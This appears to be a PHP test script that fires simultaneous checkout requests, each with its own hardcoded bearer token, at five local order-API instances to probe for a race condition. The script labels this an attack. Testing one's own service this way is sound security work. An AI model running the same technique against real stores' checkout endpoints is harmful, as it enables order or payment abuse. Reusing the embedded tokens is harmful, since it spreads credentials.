<?php


$urls = [
    "http://127.0.0.1:8000/api/v1/orders/checkout",
    "http://127.0.0.1:8001/api/v1/orders/checkout",
    "http://127.0.0.1:8002/api/v1/orders/checkout",
    "http://127.0.0.1:8003/api/v1/orders/checkout",
    "http://127.0.0.1:8004/api/v1/orders/checkout"
];


$tokens = [
    "b42627e3eeb313a916e1ef242b0967a44e83e08c1da0138a78ddcbf868afb5f9db33e9731b7af6ee",
    "4cbb2036227b44422be2ceb475304f74165928824a639051b1109284c6256d1ac4e646201d32bfd3",
    "ad497232afbb9aa9d2fc70310289afd2fa840705ab35b2ab7d18f2f1f69af3520df17518cd24c11b",
    "cd4ea16f12e4041de17f991655dae088e35d6bb872bcaad6a59205b8911c153fbb2b5e550b43dba8",
    "902ac331bdc79ea0b7e94460a6196f56e9b1ee652de71c94057cf6c096658ff9db67c2d5ce61d48c"
];

$data = json_encode(["shipping_address" => "123 Race Condition Street"]);
$mh = curl_multi_init();
$handles = [];

echo " Launching Multi-Port Race Condition Attack...\n";

foreach ($tokens as $index => $token) {
  
    $ch = curl_init($urls[$index]);
    
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Authorization: Bearer $token",
        "Content-Type: application/json",
        "Accept: application/json"
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    curl_multi_add_handle($mh, $ch);
    $handles[$index] = $ch;
}

$running = null;
do {
    curl_multi_exec($mh, $running);
} while ($running > 0);

echo "\n--- Results ---\n";
foreach ($handles as $index => $ch) {
    $response = curl_multi_getcontent($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $port = 8000 + $index;
    echo "User " . ($index + 1) . " (Port $port) | Status: $status | Response: " . substr($response, 0, 100) . "...\n";
    curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);